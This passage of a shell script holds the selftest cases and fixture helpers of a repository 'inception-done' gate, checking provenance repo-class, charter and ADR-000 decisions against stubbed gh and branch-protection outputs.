  _id_mkdisp_apply "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_priv_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: gate-provenance repo-class"
  st_has "cannot pass Inception silently provenance-less"
  if [ "$RC" -ne 0 ]; then
    echo "    ok  : rc $RC (non-zero, as a strict FAIL leg must produce)"
  else
    echo "    BAD : rc 0 — a strict FAIL leg must not report gate satisfied"; st_fail=1
  fi
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_priv_stub" MODE=surface run_gate "$d" ) 2>&1 ); RC=$?
  st_has "OUTSTANDING: gate-provenance repo-class"
  st_hasnt "FAIL: gate-provenance repo-class"

  # (r) SAME fixture + a validated na disposition for gate-provenance -> N/A (an adopter who has
  # consciously dispositioned provenance is not blocked twice). The na file is written EXPLICITLY
  # by _id_mkdisp_na — the original draft reused the tmpl's inherited gate-dispositions.txt, which
  # is export-ignore'd and therefore ABSENT in every incepted-export verify context (the ambient-
  # content hermeticity face; see _id_mkdisp_na's header for the measurement).
  # NOTE: no whole-gate st_rc assertion here (same rationale as every other claude-code fixture in
  # this file, stated at the oracle-marker comment above: the cloned fixture tree's OWN unrelated
  # harness-adapter leg does not always come up clean, so only THIS leg's specific lines are asserted.
  echo "--- (r) gate-provenance repo-class: validated na disposition -> N/A, not blocked twice ---"
  d=$(st_mkfix r claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"
  _id_mkdisp_na "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_priv_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "N/A: gate-provenance repo-class"
  st_hasnt "FAIL: gate-provenance repo-class"

  # (s) NOT deployable (no Dockerfile, no deploy workflow) -> N/A regardless of repo-class (proves
  # the AND: deployable must be TRUE, not just private+user-owned, for this leg to fire).
  echo "--- (s) gate-provenance repo-class: not deployable -> N/A regardless of privacy ---"
  d=$(st_mkfix s claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  _id_mkdisp_apply "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_priv_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "N/A: gate-provenance repo-class"
  st_has "no deploy surface"
  st_hasnt "FAIL: gate-provenance repo-class"

  # (t) deployable + PUBLIC repo -> PASS (proves the AND's other operand: private must be TRUE too).
  echo "--- (t) gate-provenance repo-class: deployable + public repo -> PASS ---"
  d=$(st_mkfix t claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"
  _id_mkdisp_apply "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_pub_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "PASS: gate-provenance repo-class"
  st_hasnt "FAIL: gate-provenance repo-class"

  # (u) [reviewer Minor-5b + security LOW-2, fix round 1] the UNVERIFIABLE branch (gh/jq
  # missing/unauthenticated) -> strict FAIL / surface OUTSTANDING, never the affirmative PASS.
  # Seam-stubbed via an empty-output INCEPTION_DONE_GH_CMD (no network, no real gh needed).
  _empty_stub='true'
  echo "--- (u) gate-provenance repo-class: gh/jq unverifiable -> FAIL/OUTSTANDING, never PASS ---"
  d=$(st_mkfix u claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"
  _id_mkdisp_apply "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_empty_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: gate-provenance repo-class"
  st_has "unverifiable"
  st_hasnt "PASS: gate-provenance repo-class"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_empty_stub" MODE=surface run_gate "$d" ) 2>&1 ); RC=$?
  st_has "OUTSTANDING: gate-provenance repo-class"
  st_hasnt "FAIL: gate-provenance repo-class"
  st_hasnt "PASS: gate-provenance repo-class"

  # (v) [security MED-1, fix round 1] a PARSE FAILURE — the gh response is well-formed JSON but
  # neither field is exactly `true`/`false` (a garbage/malformed value) — must be unverifiable
  # (strict FAIL / surface OUTSTANDING), NEVER the affirmative public/org PASS. The measured defect
  # this fixture kills: before the fix, an unparseable isPrivate fell through the `true && false`
  # test to the `else` arm and printed a bare PASS.
  _garbage_stub='printf {"isPrivate":"maybe","isInOrganization":false}'
  echo "--- (v) gate-provenance repo-class: garbage/malformed gh JSON -> FAIL/OUTSTANDING, never PASS ---"
  d=$(st_mkfix v claude-code); st_install_hook "$d"; st_gh "$d"; st_bpstub "$d" 0
  printf 'FROM scratch\n' > "$d/Dockerfile"
  _id_mkdisp_apply "$d"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_garbage_stub" MODE=strict run_gate "$d" ) 2>&1 ); RC=$?
  st_has "FAIL: gate-provenance repo-class"
  st_has "malformed"
  st_hasnt "PASS: gate-provenance repo-class"
  OUT=$( ( INCEPTION_DONE_GH_CMD="$_garbage_stub" MODE=surface run_gate "$d" ) 2>&1 ); RC=$?
  st_has "OUTSTANDING: gate-provenance repo-class"
  st_hasnt "FAIL: gate-provenance repo-class"
  st_hasnt "PASS: gate-provenance repo-class"

  # (n1)-(n3) decided-not-present legs (INCEPTION-DONE-DECIDED-NOT-PRESENT). Load-bearing negatives:
  # the §1 Overview template placeholder and the unfilled example ADR-000 must each red STRICT; an
  # absent ADR reds too; (n3) proves surface stays green on both (incept's own post-scaffold verify
  # must not red on the judgment steps it tells the adopter are still theirs).
  echo "--- (n1) strict: charter placeholder present -> FAIL ---"
  d=$(st_mkfix n1 claude-code); st_install_hook "$d"
  printf '%s\n' '**Problem:** [what problem this solves, for whom]' >> "$d/CLAUDE.md"
  st_run "$d"
  st_has "FAIL: charter undecided"
  st_hasnt "PASS: charter decided"
  st_rc 1
  echo "--- (n2) strict: ADR-000 still the unfilled example -> FAIL; absent -> FAIL ---"
  d=$(st_mkfix n2 claude-code); st_install_hook "$d"
  st_run "$d"
  st_has "PASS: charter decided"
  st_has "PASS: stack decision recorded"
  st_undecided_adr "$d"
  st_run "$d"
  st_has "FAIL: stack decision unrecorded"
  st_has "unfilled example"
  st_hasnt "PASS: stack decision recorded"
  st_rc 1
  rm -f "$d/docs/architecture/ADR-000-stack.md"
  st_run "$d"
  st_has "FAIL: stack decision unrecorded"
  st_has "absent"
  st_rc 1
  echo "--- (n3) surface: both undecided -> these legs defer, no FAIL from them ---"
  d=$(st_mkfix n3 claude-code); st_install_hook "$d"
  printf '%s\n' '**Problem:** [what problem this solves, for whom]' >> "$d/CLAUDE.md"
  st_undecided_adr "$d"
  st_run "$d" surface
  st_hasnt "FAIL: charter undecided"
  st_hasnt "FAIL: stack decision"
  st_has "deferred to strict"

  rm -rf "$WORK" 2>/dev/null || true
  if [ "$st_fail" = 0 ]; then
    echo "inception-done --selftest: OK"; return 0
  fi
  echo "inception-done --selftest: FAIL" >&2; return 1
}

# ── seed_fixture_template <root> <dest> : build a committed fixture-template repo at <dest> from
#    <root>, so st_mkfix can cheaply re-clone it. Lives BELOW the oracle marker (never mutated). It
#    chooses clone-vs-worktree-seed across THREE cases:
#      1. HEAD tracks hooks/pre-push (the kit repo; the exported tree adopter-export-wired.sh
#         init+add+commits before the aggregate) -> `git clone` copies the committed content. Proven;
#         what CI has always exercised.
#      2. No commit yet (CP-5: a freshly incepted adopter — incept git-inits but does NOT commit) ->
#         `git clone` would copy an EMPTY template, so every fixture assertion silently missed and this
#         selftest reddened inside every adopter tree. Seed from the WORKING TREE instead.
#      3. K9 — a commit EXISTS but is a PRE-INCEPT HEAD that does not reflect the incepted worktree
#         (it lacks hooks/pre-push + adapters/). `git clone` would copy that INCOMPLETE tree, so the
#         fixtures would silently lack hooks/pre-push and assertions would miss. So we gate the clone
#         path on HEAD actually TRACKING hooks/pre-push (`git cat-file -e HEAD:hooks/pre-push` — the
#         incepted-marker probe), NOT merely on HEAD existing, and fall back to the SAME worktree-seed
#         as case 2. The worktree is the truth; the `hooks/pre-push absent` guard below keeps the
#         fallback fail-closed.
#    An earlier revision of the CP-5 fix copied the worktree UNCONDITIONALLY with `tar --exclude='./.git'`.
#    That passed on macOS and FAILED on Linux CI (BSD vs GNU tar disagree on the exclude), breaking
#    adopter-export-wired's selftest. The non-vacuity sweep caught it. The worktree path below uses a
#    portable `find` walk instead — no tar. Do not reintroduce tar here.
seed_fixture_template() {
  _sft_root="$1"; _sft_dest="$2"
  # K9: gate the clone fast-path on HEAD actually TRACKING hooks/pre-push (the incepted-marker probe),
  # NOT merely on HEAD existing. A pre-incept HEAD exists but does not track hooks/pre-push, so `git
  # cat-file -e HEAD:hooks/pre-push` is false and the `&&` falls through to the worktree-seed below.
  if git -C "$_sft_root" rev-parse --verify -q HEAD >/dev/null 2>&1 \
     && git -C "$_sft_root" cat-file -e HEAD:hooks/pre-push 2>/dev/null; then
    if ! git clone -q "$_sft_root" "$_sft_dest" 2>/dev/null; then
      echo "inception-done --selftest: FAIL — cannot clone the kit repo from $_sft_root (fixtures need a real git tree)"
      return 1
    fi
  else
    # Seed the template from the WORKING TREE, then init+commit it so st_mkfix can clone it exactly.
    mkdir -p "$_sft_dest"
    ( cd "$_sft_root" && find . -name .git -prune -o -type f -print ) | while IFS= read -r _f; do
      _rel=${_f#./}
      mkdir -p "$_sft_dest/$(dirname "$_rel")" 2>/dev/null || continue
      cp "$_sft_root/$_rel" "$_sft_dest/$_rel" 2>/dev/null || true
    done
    if [ ! -f "$_sft_dest/hooks/pre-push" ]; then
      echo "inception-done --selftest: FAIL — cannot seed fixtures from $_sft_root (hooks/pre-push absent)"
      return 1
    fi
    if ! git -C "$_sft_dest" init -q \
       || ! git -C "$_sft_dest" add -A \
       || ! git -C "$_sft_dest" -c user.email=selftest@kit -c user.name=selftest commit -qm fixtures; then
      echo "inception-done --selftest: FAIL — cannot seed the fixture template repo"
      return 1
    fi
  fi
}

# ── st_* helpers + the st_fail accumulator: BELOW the oracle marker (never mutated). ────────────
# st_run <dir>: capture run_gate's combined output in OUT and its return in RC (subshelled so its
#   `cd "$DIR"` does not move the selftest's own working directory).
st_run() { OUT=$( ( MODE="${2:-strict}" run_gate "$1" ) 2>&1 ); RC=$?; }
# st_has <substr>: OUT must contain <substr>. st_hasnt: OUT must NOT. st_rc <n>: RC must equal <n>.
st_has()   { case "$OUT" in *"$1"*) printf '    ok  : has [%s]\n' "$1" ;; *) printf '    BAD : MISSING [%s]\n' "$1"; st_fail=1 ;; esac; }
st_hasnt() { case "$OUT" in *"$1"*) printf '    BAD : SHOULD-NOT have [%s]\n' "$1"; st_fail=1 ;; *) printf '    ok  : absent [%s]\n' "$1" ;; esac; }
st_rc()    { if [ "$RC" = "$1" ]; then printf '    ok  : rc %s\n' "$RC"; else printf '    BAD : rc %s (wanted %s)\n' "$RC" "$1"; st_fail=1; fi; }
# st_mkfix <name> <harness>: echo the path to a fresh project fixture that (before perturbation)
#   satisfies every leg — a cheap local re-clone of the once-cloned template, with the four adopter
#   files stamped and CLAUDE.md carrying real (non-placeholder) header fields + the harness value.
st_mkfix() {
  _d="$WORK/$1"
  git clone -q "$WORK/tmpl" "$_d"
  : > "$_d/ENGINEERING-PRINCIPLES.md"; : > "$_d/RUNBOOK.md"; : > "$_d/.env.example"
  {
    echo "# Fixture project"
    echo "**Project:** fixture-project"
    echo "**Intent owner:** the fixture owner"
    echo "- **Target harness(es)** (§harness-neutrality): $2"
  } > "$_d/CLAUDE.md"
  # decided-not-present legs: the template clone carries the kit's UNFILLED example ADR-000, which the
  # strict gate reds by design — give every fixture a decided one; (n1)/(n2)/(n3) undo this deliberately.
  mkdir -p "$_d/docs/architecture"
  printf '# ADR-000\n\n## Fit rationale\nteam skills and ecosystem fit for this workload.\n' > "$_d/docs/architecture/ADR-000-stack.md"
  printf '%s' "$_d"
}
# st_undecided_adr <dir>: put the UNFILLED example back (bracketed body carrying the engine's sentinel)
st_undecided_adr() { printf '# ADR-000\n\n## Fit rationale\n[why this stack fits THIS problem — cite the fit dimensions]\n' > "$1/docs/architecture/ADR-000-stack.md"; }
st_install_hook() { cp "$1/hooks/pre-push" "$1/.git/hooks/pre-push"; chmod +x "$1/.git/hooks/pre-push"; }
# st_tracked <dir>: switch the fixture to TRACKED-HOOKS mode (Δ6) — remove any installed copy (this
#   mode's green must come from the tracked file alone) and point core.hooksPath at the tree's own
#   hooks/ dir. Set INSIDE this script's own process: that key is human-gated by the agent guard, so
#   fixtures build it here rather than from an agent's shell.
st_tracked() { rm -f "$1/.git/hooks/pre-push"; git -C "$1" config core.hooksPath hooks; }
# ── branch-protection leg fixtures (K5). st_gh/st_nongh/st_norem set the origin host; st_bpstub
#    swaps in a branch-protection.sh returning a fixed exit; st_attest stamps a non-GitHub attestation.
st_gh()     { git -C "$1" remote add origin https://github.com/fixture/repo.git 2>/dev/null || git -C "$1" remote set-url origin https://github.com/fixture/repo.git; }
st_nongh()  { git -C "$1" remote add origin https://gitlab.com/fixture/repo.git 2>/dev/null || git -C "$1" remote set-url origin https://gitlab.com/fixture/repo.git; }
st_norem()  { git -C "$1" remote remove origin 2>/dev/null || true; }
# st_bpstub <dir> <exit>: replace branch-protection.sh in the fixture with a stub returning <exit> (for --raw and otherwise)
st_bpstub() {  # <fixture> <rc> [stdout-line]: the line travels via a side file, never interpolated into the stub's source
  [ -n "${3:-}" ] && printf '%s\n' "$3" > "$1/conformance/bp-stub.msg"
  printf '#!/bin/sh\n[ -f "$(dirname "$0")/bp-stub.msg" ] && cat "$(dirname "$0")/bp-stub.msg"\nexit %s\n' "$2" > "$1/conformance/branch-protection.sh"; chmod +x "$1/conformance/branch-protection.sh"; }
# st_attest <dir>: append a non-GitHub attestation using the STABLE (§branch-protection) marker
st_attest() { printf '%s\n' '- **Branch protection** (§branch-protection): attested: gitlab protected-branches' >> "$1/CLAUDE.md"; }

case "${1:-}" in
  --selftest) selftest; exit $? ;;
  *)
    MODE=strict; _dir=.
    for a in "$@"; do case "$a" in --surface) MODE=surface ;; --strict) MODE=strict ;; *) _dir="$a" ;; esac; done
    MODE="$MODE" run_gate "$_dir"; exit $? ;;
esac
